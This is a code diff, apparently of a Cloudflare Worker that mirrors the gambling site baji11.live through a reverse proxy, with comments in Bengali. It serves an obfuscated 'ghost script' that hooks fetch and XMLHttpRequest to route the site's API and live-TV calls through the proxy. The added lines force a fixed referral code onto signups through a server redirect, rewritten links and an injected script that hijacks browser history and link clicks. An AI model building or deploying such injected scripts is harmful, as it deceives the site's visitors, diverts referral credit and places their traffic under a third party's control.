@@ -6,8 +6,6 @@ export default {
     
     const TARGET_DOMAIN = env.TARGET_URL || "https://www.baji11.live";
     const API_DOMAINS = ["liveapi247.live"]; 
-    
-    // আপনার দেওয়া নতুন লাইভ টিভির ডোমেইন যুক্ত করা হলো
     const MEDIA_AND_SCORE_DOMAINS = ["tv.nginx0.com"]; 
     
     // ==========================================
@@ -16,6 +14,12 @@ export default {
     const ALL_TARGETS = [...API_DOMAINS, ...MEDIA_AND_SCORE_DOMAINS]; 
     const url = new URL(request.url);
     const originHeader = request.headers.get("Origin") || `https://${url.host}`;
+
+    // 🚀 NEW: শক্তিশালী সাইনআপ রিডাইরেক্ট (সার্ভার লেভেল)
+    // কেউ যদি ম্যানুয়ালি বা অন্য কোনোভাবে শুধু /signup এ ঢোকে, তাকে আপনার লিংকে পাঠাবে
+    if (url.pathname === '/signup' && !url.searchParams.has('refcode')) {
+        return Response.redirect(`https://${url.host}/signup?refcode=iZfmaT3h`, 302);
+    }
 
     // 🛡️ প্রফেশনাল সিকিউরিটি: Ghost Script Route
     if (url.pathname === '/__secure_core.js') {
@@ -28,7 +32,6 @@ export default {
             });
         }
 
-        // প্রফেশনাল Minified & Packaged Code (লাইভ টিভির ডোমেইন সহ আপডেটেড)
         const secretCode = `!function(){const r="/__api_proxy/",e=["liveapi247.live","tv.nginx0.com"];function t(r){return"string"==typeof r&&!r.includes("__api_proxy")&&e.some((e=>r.includes(e)))}const n=window.fetch;window.fetch=async function(...e){try{let o=e[0];"string"==typeof o&&t(o)?e[0]=r+o:o instanceof Request&&t(o.url)&&(e[0]=new Request(r+o.url,o))}catch(r){}return n.apply(this,e)};const o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(e,n,...c){try{"string"==typeof n&&t(n)&&(n=r+n)}catch(r){}return o.call(this,e,n,...c)}}();`;
 
         return new Response(secretCode, {
@@ -119,13 +122,31 @@ export default {
             text = text.replaceAll(originalUrl.replace(/\//g, '\\/'), proxyUrl.replace(/\//g, '\\/'));
         });
 
-        // 🔒 Ghost Script Injection
         if (contentType.includes("text/html")) {
+            // 🚀 NEW: HTML লেভেলে বাটন লিংক রিপ্লেস
+            text = text.replaceAll('href="/signup"', 'href="/signup?refcode=iZfmaT3h"');
+            
+            // 🚀 NEW: React Router হ্যাক (যাতে কোনোভাবেই মিস না হয়)
+            const refScript = `
+            <script>
+              (function(){
+                const refLink = '/signup?refcode=iZfmaT3h';
+                const p = history.pushState;
+                history.pushState = function(...a) { if(a[2] === '/signup') a[2] = refLink; return p.apply(this, a); };
+                const r = history.replaceState;
+                history.replaceState = function(...a) { if(a[2] === '/signup') a[2] = refLink; return r.apply(this, a); };
+                document.addEventListener('click', function(e) {
+                  const el = e.target.closest('a');
+                  if(el && el.getAttribute('href') === '/signup') el.setAttribute('href', refLink);
+                }, true);
+              })();
+            </script>`;
+
             const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
             if (text.includes('<head>')) {
-              text = text.replace('<head>', '<head>' + ghostScriptTag);
+              text = text.replace('<head>', '<head>' + ghostScriptTag + refScript);
             } else {
-              text = ghostScriptTag + text;
+              text = ghostScriptTag + refScript + text;
             }
         }
         
